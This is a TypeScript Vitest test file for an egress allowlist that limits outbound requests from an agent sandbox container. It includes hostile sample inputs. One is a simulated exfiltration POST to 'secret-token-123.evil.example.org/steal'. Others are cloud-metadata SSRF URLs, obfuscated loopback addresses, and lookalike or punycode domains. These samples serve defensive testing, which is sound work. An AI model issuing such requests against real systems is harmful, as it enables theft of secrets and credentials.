import { afterEach, describe, expect, it, vi } from 'vitest';
import {
  checkEgress,
  egressAllowlistHandler,
  egressEnforced,
  hostMatchesPattern,
  internalApiHost,
  internalPathAllowed,
  isIpLiteral,
  isRunSandboxName,
} from './egressAllowlist';

const GIT_CT = 'application/x-git-upload-pack-request';
const INTERNAL = { host: 'api.builderforce.ai', executionId: 7 };
const ctx = () => ({ containerId: 'c1', className: 'AgentContainerDO', params: { executionId: 7, internalHost: 'api.builderforce.ai' } });
const call = (url: string, init?: RequestInit) => egressAllowlistHandler(new Request(url, init), {}, ctx());

afterEach(() => { vi.unstubAllGlobals(); vi.restoreAllMocks(); });

describe('enforcement flag and instance identity', () => {
  it('is on only for the string "true"', () => {
    expect(egressEnforced({ SANDBOX_EGRESS_ENFORCE: 'true' })).toBe(true);
    for (const v of [undefined, 'false', '1', '']) expect(egressEnforced({ SANDBOX_EGRESS_ENFORCE: v })).toBe(false);
    expect(egressEnforced(undefined)).toBe(false);
  });
  it('treats exec:* as run sandboxes only', () => {
    expect(isRunSandboxName('exec:12')).toBe(true);
    expect(isRunSandboxName('webscan:12')).toBe(false);
    expect(isRunSandboxName(undefined)).toBe(false);
  });
  it('computes the internal host from the environment, with the sandbox default', () => {
    expect(internalApiHost({ INTERNAL_API_BASE_URL: 'https://api.example.test/' })).toBe('api.example.test');
    expect(internalApiHost({})).toBe('api.builderforce.ai');
    expect(internalApiHost({ INTERNAL_API_BASE_URL: 'http://169.254.169.254' })).toBeNull();
    expect(internalApiHost({ INTERNAL_API_BASE_URL: 'nonsense' })).toBeNull();
  });
});

describe('egress allowlist matcher', () => {
  it('allows reads on allowlisted hosts', () => {
    for (const h of ['github.com', 'api.github.com', 'codeload.github.com', 'registry.npmjs.org', 'pypi.org', 'files.pythonhosted.org', 'registry.yarnpkg.com', 'nodejs.org', 'static.crates.io', 'rubygems.org', 'jsr.io']) {
      expect(checkEgress(h, 'GET').allowed, h).toBe(true);
      expect(checkEgress(h, 'HEAD').allowed, h).toBe(true);
    }
  });

  it('does not allow the golang module proxies (a GET makes them fetch a caller-chosen server)', () => {
    for (const h of ['proxy.golang.org', 'sum.golang.org']) expect(checkEgress(h, 'GET').allowed, h).toBe(false);
  });

  it('allows wildcard subdomains but not the bare apex', () => {
    expect(checkEgress('raw.githubusercontent.com').allowed).toBe(true);
    expect(checkEgress('a.b.githubusercontent.com').allowed).toBe(true);
    expect(hostMatchesPattern('githubusercontent.com', '*.githubusercontent.com')).toBe(false);
  });

  it('is case- and trailing-dot-insensitive', () => {
    expect(checkEgress('GitHub.com.').allowed).toBe(true);
  });

  it('denies lookalikes, punycode included', () => {
    for (const h of ['github.com.evil.io', 'evilgithub.com', 'xgithub.com', 'raw.githubusercontent.com.evil.io', 'registry.npmjs.org.evil.io', 'notpypi.org', 'xn--githb-fsa.com', 'registry.npmmirror.com']) {
      expect(checkEgress(h).allowed, h).toBe(false);
    }
  });

  it('denies IP literals, private and link-local ranges included', () => {
    for (const h of ['169.254.169.254', '100.100.100.200', '10.0.0.1', '192.168.1.1', '172.16.0.1', '127.0.0.1', '140.82.112.3', '2130706433', '0x7f000001', '[fd00::1]', 'fd00::1', '::1', '::ffff:a9fe:a9fe']) {
      expect(isIpLiteral(h), h).toBe(true);
      expect(checkEgress(h).allowed, h).toBe(false);
    }
  });

  it('denies localhost and internal names', () => {
    for (const h of ['localhost', 'app.localhost', 'metadata.google.internal', 'svc.internal']) expect(checkEgress(h).allowed, h).toBe(false);
  });

  it('applies the method rules', () => {
    for (const h of ['api.github.com', 'registry.npmjs.org', 'codeload.github.com', 'raw.githubusercontent.com', 'pypi.org']) {
      for (const m of ['POST', 'PUT', 'DELETE']) expect(checkEgress(h, m, '/x', { contentType: GIT_CT }).allowed, `${m} ${h}`).toBe(false);
    }
  });

  it('allows github.com POST only to <owner>/<repo>[.git]/git-upload-pack with the upload-pack content-type', () => {
    expect(checkEgress('github.com', 'POST', '/o/r.git/git-upload-pack', { contentType: GIT_CT }).allowed).toBe(true);
    expect(checkEgress('github.com', 'POST', '/o/r/git-upload-pack', { contentType: `${GIT_CT}; charset=x` }).allowed).toBe(true);
    expect(checkEgress('github.com', 'POST', '/o/r.git/git-upload-pack', { contentType: 'application/json' }).allowed).toBe(false);
    expect(checkEgress('github.com', 'POST', '/o/r.git/git-upload-pack').allowed).toBe(false);
    expect(checkEgress('github.com', 'POST', '/o/r.git/git-receive-pack', { contentType: GIT_CT }).allowed).toBe(false);
    expect(checkEgress('github.com', 'POST', '/login', { contentType: GIT_CT }).allowed).toBe(false);
    // A web route that merely ENDS in /git-upload-pack:
    expect(checkEgress('github.com', 'POST', '/session/extra/path/git-upload-pack', { contentType: GIT_CT }).allowed).toBe(false);
    expect(checkEgress('github.com', 'POST', '/settings/tokens/new/git-upload-pack', { contentType: GIT_CT }).allowed).toBe(false);
    expect(checkEgress('github.com', 'POST', '/git-upload-pack', { contentType: GIT_CT }).allowed).toBe(false);
  });

  it('scopes the Worker host to this run\'s git proxy and the container-op callback', () => {
    const ok = (m: string, p: string, exec: number | null = 7) => checkEgress('api.builderforce.ai', m, p, { internal: { host: 'api.builderforce.ai', executionId: exec } }).allowed;
    expect(ok('POST', '/api/runtime/internal/container-op')).toBe(true);
    expect(ok('GET', '/api/runtime/internal/container-git/7.git/info/refs')).toBe(true);
    expect(ok('POST', '/api/runtime/internal/container-git/7.git/git-upload-pack')).toBe(true);
    expect(ok('POST', '/api/runtime/internal/container-git/7.git/git-receive-pack')).toBe(true);
    // Everything else on the Worker is a 403: other runs, other routes, the admin surface.
    expect(ok('GET', '/api/runtime/internal/container-git/8.git/info/refs')).toBe(false);
    expect(ok('GET', '/api/runtime/internal/container-git/7.git/info/other')).toBe(false);
    expect(ok('GET', '/api/auth/me')).toBe(false);
    expect(ok('POST', '/api/runtime/sessions')).toBe(false);
    expect(ok('GET', '/api/runtime/internal/container-git/7.git/info/refs', null)).toBe(false);
    expect(internalPathAllowed('/api/runtime/internal/container-op', null)).toBe(true);
  });

  it('never trusts a denied name as the internal host', () => {
    expect(checkEgress('localhost', 'POST', '/api/runtime/internal/container-op', { internal: { host: 'localhost', executionId: 7 } }).allowed).toBe(false);
    expect(checkEgress('169.254.169.254', 'POST', '/api/runtime/internal/container-op', { internal: { host: '169.254.169.254', executionId: 7 } }).allowed).toBe(false);
  });

  it('keeps the path out of the loggable reason but in the detail', () => {
    const v = checkEgress('registry.npmjs.org', 'PUT', '/-/secret-path');
    expect(v.allowed).toBe(false);
    if (!v.allowed) { expect(v.reason).not.toContain('secret-path'); expect(v.detail).toContain('/-/secret-path'); }
  });
});

describe('egress outbound handler (fake upstream)', () => {
  it('refuses a non-allowlisted host: 403 naming host, method and path; logs TLD+domain and hash only', async () => {
    const upstream = vi.fn();
    vi.stubGlobal('fetch', upstream);
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    const res = await call('https://secret-token-123.evil.example.org/steal', { method: 'POST', body: 'x' });
    expect(res.status).toBe(403);
    const text = await res.text();
    expect(text).toContain('secret-token-123.evil.example.org');
    expect(text).toContain('POST');
    expect(upstream).not.toHaveBeenCalled();
    const logged = String(warn.mock.calls[0]?.[0]);
    expect(logged).toContain('"executionId":7');
    expect(logged).toContain('"domain":"example.org"');
    expect(logged).toContain('hostHash');
    expect(logged).not.toContain('secret-token-123');
    expect(logged).not.toContain('/steal');
  });

  it('logs only the TLD for a host with two labels or fewer', async () => {
    vi.stubGlobal('fetch', vi.fn());
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    await call('https://attacker-chosen-name.io/x');
    const logged = String(warn.mock.calls[0]?.[0]);
    expect(logged).toContain('"domain":"io"');
    expect(logged).not.toContain('attacker-chosen-name');
  });

  it.each([
    'http://169.254.169.254/latest/meta-data/',
    'http://0x7f.1/',
    'http://[::ffff:a9fe:a9fe]/',
    'http://2130706433/',
    'https://xn--githb-fsa.com/',
  ])('denies %s without calling upstream', async (url) => {
    const upstream = vi.fn();
    vi.stubGlobal('fetch', upstream);
    vi.spyOn(console, 'warn').mockImplementation(() => {});
    expect((await call(url)).status).toBe(403);
    expect(upstream).not.toHaveBeenCalled();
  });

  it('forwards an allowlisted host without following redirects', async () => {
    const upstream = vi.fn(async (_r: Request) => new Response('ok'));
    vi.stubGlobal('fetch', upstream);
    const res = await call('https://registry.npmjs.org/left-pad');
    expect(res.status).toBe(200);
    expect(upstream).toHaveBeenCalledTimes(1);
    expect(upstream.mock.calls[0]![0].redirect).toBe('manual');
  });

  it('strips Cookie and Authorization on third-party hosts but keeps them for the Worker host', async () => {
    const upstream = vi.fn(async (_r: Request) => new Response('ok'));
    vi.stubGlobal('fetch', upstream);
    await call('https://registry.npmjs.org/left-pad', { headers: { cookie: 'a=b', authorization: 'Bearer t', accept: 'x/y' } });
    const third = upstream.mock.calls[0]![0];
    expect(third.headers.get('cookie')).toBeNull();
    expect(third.headers.get('authorization')).toBeNull();
    expect(third.headers.get('accept')).toBe('x/y');
    await call('https://api.builderforce.ai/api/runtime/internal/container-git/7.git/info/refs', { headers: { authorization: 'Basic abc' } });
    expect(upstream.mock.calls[1]![0].headers.get('authorization')).toBe('Basic abc');
  });

  it('upgrades an allowlisted http:// request to https', async () => {
    const upstream = vi.fn(async (_r: Request) => new Response('ok'));
    vi.stubGlobal('fetch', upstream);
    await call('http://registry.npmjs.org/left-pad');
    expect(upstream.mock.calls[0]![0].url).toBe('https://registry.npmjs.org/left-pad');
  });

  it('passes a 3xx to a denied host back to the container instead of following it', async () => {
    const upstream = vi.fn(async (_r: Request) => new Response(null, { status: 302, headers: { location: 'http://169.254.169.254/' } }));
    vi.stubGlobal('fetch', upstream);
    const res = await call('https://github.com/o/r/archive/x.tar.gz');
    expect(res.status).toBe(302);
    expect(res.headers.get('location')).toBe('http://169.254.169.254/');
    expect(upstream).toHaveBeenCalledTimes(1);
  });

  it('enforces method/path/content-type rules at the handler', async () => {
    const upstream = vi.fn(async (_r: Request) => new Response('ok'));
    vi.stubGlobal('fetch', upstream);
    vi.spyOn(console, 'warn').mockImplementation(() => {});
    expect((await call('https://registry.npmjs.org/-/npm/v1/user', { method: 'PUT', body: 'x' })).status).toBe(403);
    expect((await call('https://github.com/o/r.git/git-receive-pack', { method: 'POST', body: 'x', headers: { 'content-type': GIT_CT } })).status).toBe(403);
    expect((await call('https://github.com/session/x/y/git-upload-pack', { method: 'POST', body: 'x', headers: { 'content-type': GIT_CT } })).status).toBe(403);
    expect((await call('https://github.com/o/r.git/git-upload-pack', { method: 'POST', body: 'x', headers: { 'content-type': 'text/plain' } })).status).toBe(403);
    expect((await call('https://github.com/o/r.git/git-upload-pack', { method: 'POST', body: 'x', headers: { 'content-type': GIT_CT } })).status).toBe(200);
    expect(upstream).toHaveBeenCalledTimes(1);
  });

  it('forwards the Worker host on this run\'s routes only', async () => {
    const upstream = vi.fn(async (_r: Request) => new Response('ok'));
    vi.stubGlobal('fetch', upstream);
    vi.spyOn(console, 'warn').mockImplementation(() => {});
    expect((await call('https://api.builderforce.ai/api/runtime/internal/container-op', { method: 'POST', body: '{}' })).status).toBe(200);
    expect((await call('https://api.builderforce.ai/api/auth/me')).status).toBe(403);
    expect((await call('https://api.builderforce.ai/api/runtime/internal/container-git/99.git/info/refs')).status).toBe(403);
    expect(upstream).toHaveBeenCalledTimes(1);
  });
});
